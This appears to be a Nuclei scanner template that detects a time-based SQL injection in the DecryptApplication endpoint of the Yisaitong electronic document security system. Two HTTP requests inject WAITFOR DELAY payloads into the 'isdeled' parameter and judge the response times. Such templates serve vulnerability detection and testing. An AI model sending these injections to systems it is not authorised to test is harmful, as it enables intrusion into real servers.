id: yisaitong-DecryptApplication-sqli

info:
  name: 亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞
  author: yisaitong
  severity: high
  tags: yisaitong

http:
  - raw:
      - |
        POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Content-Type: application/x-www-form-urlencoded

        isdeled=1'WAITFOR DELAY '0:0:2'--&isExam=&command=DownLoadLogs

      - |
        POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Content-Type: application/x-www-form-urlencoded

        isdeled=1'WAITFOR DELAY '0:0:4'--&isExam=&command=DownLoadLogs

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration_1 >= 2'
          - 'duration_1 < 4'
          - 'duration_2 >= 4'
          - 'duration_2 < 6'
        condition: and

